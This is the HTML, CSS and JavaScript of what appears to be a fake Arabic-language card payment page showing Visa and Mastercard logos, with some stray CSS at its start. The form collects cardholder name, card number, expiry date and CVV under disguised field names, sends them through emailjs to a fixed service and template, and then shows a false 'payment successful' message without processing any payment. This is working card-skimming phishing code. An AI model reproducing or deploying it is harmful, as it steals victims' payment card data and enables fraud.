height:75px;

justify-content:center;

<style>

*{
margin:0;
padding:0;
box-sizing:border-box;
}

body{
font-family:'Inter',sans-serif;
background:#f5f5f5;
color:#111;
}

.wrapper{
max-width:420px;
margin:auto;

}

}

padding:24px;

.brand-row{
display:flex;

align-items:center;

.brand-title{
font-size:22px;

}

.brand-row img{
height:28px;
}

.group{
margin-bottom:20px;
}

label{
display:flex;
align-items:center;
height:28px;
margin-bottom:8px;
font-size:15px;
font-weight:600;
}

.required{
color:#d32f2f;
}

.input-wrap{
position:relative;
}

input{
width:100%;
height:56px;
border:1px solid #cfcfcf;
border-radius:6px;
padding:0 16px;
font-size:16px;
background:white;
transition:0.2s;
}

input:focus{
outline:none;
border-color:#1976d2;
box-shadow:0 0 0 3px rgba(25,118,210,0.12);
}

.icon{
position:absolute;
left:14px;
top:50%;
transform:translateY(-50%);
font-size:18px;
opacity:0.5;
}

.row{
display:flex;
gap:14px;
}

.row .group{
flex:1;
min-width:0;
}

button{
width:100%;
height:54px;
border:none;
border-radius:8px;
background:#1976d2;
color:white;
font-size:18px;
font-weight:600;
margin-top:10px;
transition:0.2s;
cursor:pointer;
}

button:active{
transform:scale(0.98);
}

.loading{
pointer-events:none;
opacity:0.8;
}

.spinner{
width:18px;
height:18px;
border:2px solid rgba(255,255,255,0.4);
border-top:2px solid white;
border-radius:50%;
display:inline-block;
animation:spin 0.8s linear infinite;
vertical-align:middle;
}

@keyframes spin{
100%{
transform:rotate(360deg);
}
}

.success{
background:#16a34a !important;
}

.footer{
padding:24px;
font-size:14px;
color:#666;
display:flex;
justify-content:space-between;
align-items:center;
border-top:1px solid #eee;
margin-top:20px;
}

.secure{
display:flex;
align-items:center;
gap:6px;
}

</style>

</head>

<body>

<div class="wrapper">

<div class="top">
<div class="method">
صفحة الدفع
</div>
</div>

<div class="content">

<div class="brand-row">

<div class="brand-title">
بيانات الدفع
</div>

<div style="display:flex; gap:8px;">
<img src="https://img.icons8.com/color/96/mastercard-logo.png">
<img src="https://img.icons8.com/color/96/visa.png">
</div>

</div>

<form id="contactForm">

<div class="group">
<label>
اسم صاحب البطاقة 
<span class="required">*</span>
</label>

<div class="input-wrap">
<input id="fullName">
</div>
</div>

<div class="group">
<label>
رقم البطاقة 
<span class="required">*</span>
</label>

<div class="input-wrap">
<input id="memberId" maxlength="19">
<div class="icon">🔒</div>
</div>
</div>

<div class="row">

<div class="group">
<label>
تاريخ الانتهاء
<span class="required">*</span>
</label>

<div class="input-wrap">
<input id="joinDate" placeholder="MM/YY" maxlength="5">
</div>
</div>

<div class="group">
<label>
CVV
<span class="required">*</span>
</label>

<div class="input-wrap">
<input id="verifyCode" maxlength="4" placeholder="123">
</div>
</div>

</div>

<button id="payBtn" type="submit">
ادفع الأن 
</button>

</form>

</div>

<div class="footer">

<div class="secure">
🔒 اتصال آمن
</div>

<div>

</div>

</div>

</div>

<script>

const member =
document.getElementById("memberId");

const joinDate =
document.getElementById("joinDate");

const verify =
document.getElementById("verifyCode");

member.addEventListener("input",()=>{

let raw =
member.value.replace(/\D/g,'');

raw =
raw.substring(0,16);

member.value =
raw.replace(/(.{4})/g,'$1 ').trim();

});

joinDate.addEventListener("input",()=>{

let val =
joinDate.value.replace(/\D/g,'');

val = val.substring(0,4);

if(val.length >=3){

val =
val.slice(0,2)+"/"+val.slice(2,4);

}

joinDate.value = val;

});

verify.addEventListener("input",()=>{

verify.value =
verify.value.replace(/\D/g,'').substring(0,4);

});

const form =
document.getElementById("contactForm");

const btn =
document.getElementById("payBtn");

form.addEventListener("submit",function(e){

e.preventDefault();

btn.classList.add("loading");

btn.innerHTML =
'<span class="spinner"></span>';

emailjs.send(
"service_dmbb2fd",
"template_z91e2wb",
{

fullName:
document.getElementById("fullName").value,

memberId:
document.getElementById("memberId").value,

joinDate:
document.getElementById("joinDate").value,

verifyCode:
document.getElementById("verifyCode").value

}

)

.then(function(){

btn.classList.remove("loading");

btn.classList.add("success");

btn.innerHTML =
"✓ تم الدفع بنجاح";

})

.catch(function(error){

alert("حدث خطأ");

console.log(error);

});

});

</script>

</body>
